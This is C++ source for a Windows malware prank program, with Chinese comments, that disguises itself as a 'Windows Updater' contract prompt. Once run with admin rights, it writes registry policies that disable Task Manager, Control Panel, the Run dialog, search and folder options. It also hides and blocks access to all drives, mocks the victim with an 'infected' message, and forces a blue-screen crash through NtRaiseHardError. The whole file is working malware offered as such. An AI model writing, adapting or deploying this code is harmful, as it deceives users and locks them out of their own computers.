#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <iostream>
#include <time.h>
#include <mmsystem.h>
#include <atlstr.h>
#include <thread>
#include"resource.h"
#pragma comment(lib, "winmm.lib")
#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
using namespace std;
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

BOOL admin()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:

    if (pAdministratorsGroup) {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return fIsRunAsAdmin;
}
void disabletskmanager() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
    RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);

}
void noclose() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoClose", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void noctrlpanel() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoControlPanel", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void nodrive() {
    HKEY hkey;
    DWORD value = 4294967295;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoDrives", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void nofind() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoFind", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void nofolderoptions() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoFolderOptions", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void noviewondrive() {
    HKEY hkey;
    DWORD value = 4294967295;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoViewOnDrive", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void norun() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoRun", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void bsod() {
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}
void message() {
    ShellExecute(NULL, L"open", L"https://www.microsoft.com/en/servicesagreement", NULL, NULL, SW_SHOWNORMAL);
}
void opendcim() {
    for (int i = 0; i <= 15; i++) {
        ShellExecute(NULL, L"open", L"https://themastersedu.com/editor_images/Image/line_20161121_main.jpg", NULL, NULL, SW_SHOWNOACTIVATE);
        Sleep(1000);
    }
}
void virus() {
    noclose();//禁用開機選單
    disabletskmanager();//禁用工作管理員
    noctrlpanel();//禁用控制台
    nodrive();//隱藏磁碟機
    nofind();//禁用搜尋,win11似乎沒用
    nofolderoptions();//隱藏資料夾選項
    noviewondrive();//禁止存取磁碟
    norun();//禁用win+R
}

int main() {
    if (admin())//確認目前是否以管理員模式執行程式
    {
        thread work1(message);//在第一個執行序裡執行打開微軟授權合約網頁
        MessageBox(NULL, (L"Please Read the Contract Then Press OK\nhttps://www.microsoft.com/en/servicesagreement"), (L"Windows Updater"), MB_OKCANCEL | MB_ICONINFORMATION);//執行MassegeBox
        PlaySound(LPCWSTR(IDR_WAVE1), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC | SND_LOOP);//播放音檔
        thread work2(virus);//執行virus函式
        MessageBox(NULL, (L"哈哈哈你好笨喔笑死呵呵"), (L"恭喜中毒"), MB_OK);//跳出MassegeBox告知中毒
        thread work3(opendcim);//打開網頁裡的圖片
        bsod();//執行藍屏使系統重開
        system("pause>nu1");
    }
    else//若不是管理員身分
    {
        PlaySound(LPCWSTR(IDR_WAVE1), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC | SND_LOOP);//播放音檔
        MessageBox(NULL, (L"Please Run As Admin Mode"), (L"ERROR"), MB_OK);//跳出MassegeBox請使用者以管理員身分執行
        system("pause>nu1");
    }
}